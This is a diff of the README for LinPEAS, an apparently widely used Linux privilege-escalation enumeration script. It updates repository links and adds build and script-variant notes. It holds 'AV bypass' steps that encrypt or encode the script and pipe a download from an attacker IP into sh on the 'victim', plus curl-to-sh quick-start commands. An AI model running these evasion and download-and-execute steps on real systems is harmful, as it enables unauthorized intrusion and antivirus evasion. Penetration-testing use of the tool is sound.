@@ -1,6 +1,6 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script
 
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
+![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
 **LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)**
 
@@ -12,12 +12,28 @@ Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks
 
 Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**
 
+## Build your own linpeas!
+
+The latest version of linpeas allows you to **select the checks you would like your linpeas to have** and built it only with those checks!
+
+This allows to create **smaller and faster linpeas scripts** for stealth and speed purposes.
+
+Check how to **select the checks you want to build [in your own linpeas following this link.](builder)**
+
+Note that by default, in the releases pages of this repository, you will find a **linpeas with all the checks**.
+
+## Differences between `linpeas_fat.sh`, `linpeas.sh` and `linpeas_small.sh`:
+
+- **linpeas_fat.sh**: Contains all checks, even third party applications in base64 embedded.
+- **linpeas.sh**: Contains all checks, but only the third party application `linux exploit suggester` is embedded. This is the default `linpeas.sh`.
+- **linpeas_small.sh**: Contains only the most *important* checks making its size smaller.
+
 ## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
+Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.
 
 ```bash
-# From github
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# From public github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 ```bash
@@ -42,9 +58,22 @@ less -r /dev/shm/linpeas.txt #Read with colors
 
 ```bash
 # Use a linpeas binary
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
+```
+
+## AV bypass
+```bash
+#open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+#Base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
 ## Firmware Analysis
@@ -61,19 +90,6 @@ bash /linpeas.sh -o software_information,interesting_files,api_keys_regex
 ```bash
 # Point to the folder containing the files you want to analyze
 bash /path/to/linpeas.sh -f /path/to/folder
-```
-
-## AV bypass
-```bash
-#open-ssl encryption
-openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
-sudo python -m SimpleHTTPServer 80 #Start HTTP server
-curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
-
-#Base64 encoded
-base64 -w0 linpeas.sh > lp.enc
-sudo python -m SimpleHTTPServer 80 #Start HTTP server
-curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
 ## Basic Information
@@ -144,56 +160,23 @@ With LinPEAS you can also **discover hosts automatically** using `fping`, `ping`
 
 LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.
 
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)
+![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)
 
 
 ## Colors
-
-<details>
-<summary>Details</summary>
-
 LinPEAS uses colors to indicate where does each section begin. But **it also uses them the identify potencial misconfigurations**.
 
-The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).
+- The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).
 
-The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to PE:
-- Possible exploitable kernel versions
-- Vulnerable sudo versions
-- Identify processes running as root
-- Not mounted devices
-- Dangerous fstab permissions
-- Writable files in interesting directories
-- SUID/SGID binaries that have some vulnerable version (it also specifies the vulnerable version)
-- SUDO binaries that can be used to escalate privileges in sudo -l (without passwd) (https://gtfobins.github.io/)
-- Check /etc/doas.conf
-- 127.0.0.1 in netstat
-- Known files that could contain passwords
-- Capabilities in interesting binaries
-- Interesting capabilities of a binary
-- Writable folders and wilcards inside info about cron jobs
-- Writables folders in PATH
-- Groups that could lead to root
-- Files that could contains passwords
-- Suspicious cronjobs
+- The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to privilege escalation.
 
-The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for:
-- Common processes run by root
-- Common not interesting devices to mount
-- Not dangerous fstab permissions
-- SUID/SGID common binaries (the bin was already found in other machines and searchsploit doesn't identify any vulnerable version)
-- Common .sh files in path
-- Common names of users executing processes
-- Common cronjobs
+- The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for known good configurations (based on the name not on the conten!)
 
-The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for:
-- Users without shell
-- Mounted devices
+- The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for: Users without shell & Mounted devices
 
-The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for:
-- Users with shell
+- The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for: Users with shell
 
-The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for:
-- Current username
+- The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for: Current username
 
 </details>
 
@@ -218,15 +201,12 @@ Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/s
 
 ## Collaborate
 
-If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
+If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
 
-If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.
+If you find any issue, please report it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues)**.
 
 **Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.
 
 ## Advisory
 
 All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
-
-
-By Polop<sup>(TM)</sup>
